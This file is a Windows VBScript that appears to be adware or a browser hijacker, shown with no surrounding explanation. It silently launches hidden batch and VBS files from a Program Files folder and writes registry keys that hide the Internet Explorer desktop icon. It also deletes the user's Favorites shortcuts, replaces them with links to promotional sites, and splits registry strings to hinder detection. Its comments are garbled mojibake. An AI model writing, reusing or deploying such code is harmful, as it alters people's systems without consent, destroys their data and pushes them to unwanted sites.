Rem 81146415 
Dim url
url = "http://www.haoha123.com/?kk"
if url = "#"&"URL"&"#" then
 url="http://www.haoha123.com/?kk"
end if
Dim WSHShell 
Set WshShell = WScript.CreateObject("WScript.Shell")
strDesktop = WshShell.SpecialFolders("Desktop") :'�����ļ��С����桱
Favorites = WshShell.SpecialFolders("Favorites") :'�����ļ��С����桱
on error resume next

strttWinDir = WshShell.ExpandEnvironmentStrings("%ProgramFiles%")
dim direct
direct= strttWinDir & "\files"

createobject("wscript.shell").run """" & direct & "\3.bat""",0

Rem 81146415
createobject("wscript.shell").run """" & direct & "\3.vbs""",0
Rem 81146415

RegPath="HKEY_CURRENT_USER\Soft"&"ware\Micro"&"soft\Win"&"dows\Current"&"Version\Expl"&"orer\HideDesktop"&"Icons\NewStart"&"Panel\{871C5380-42A0-1069-A2EA-08002B30309D}"
RegPath1="HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu\{871C5380-42A0-1069-A2EA-08002B30309D}"
Type_Name="REG_DWORD"
Key_Data=1
WshShell.RegWrite RegPath,Key_Data,Type_Name
WshShell.RegWrite RegPath1,Key_Data,Type_Name
Set WSHShell = WScript.CreateObject("WScript.Shell") 
strDesktop = WSHShell.SpecialFolders("Desktop") 
WSHShell.AppActivate strDesktop 
WSHShell.SendKeys "{F5}" 
Rem "#REM#" 

'=========

Set objFSO = CreateObject("Scripting.FileSystemObject")
objFSO.DeleteFile(Favorites&"\����\*.url"), True

Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����\�� �� ��.url")
oUrlLink.TargetPath = "http://www.haoha123.com/taobao/"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����\����С��Ϸ.url")
oUrlLink.TargetPath = "http://www.131youxi.com/?kk"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����\����Ů��.url")
oUrlLink.TargetPath = "http://www.5507.com/"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut(Favorites & "\�� �� ��.url")
oUrlLink.TargetPath = "http://www.haoha123.com/taobao/"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����С��Ϸ.url")
oUrlLink.TargetPath = "http://www.131youxi.com/"
oUrlLink.Save

Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����Ů��.url")
oUrlLink.TargetPath = "http://www.5507.com/?f"
oUrlLink.Save

Rem "#REM#"
 
wscript.quit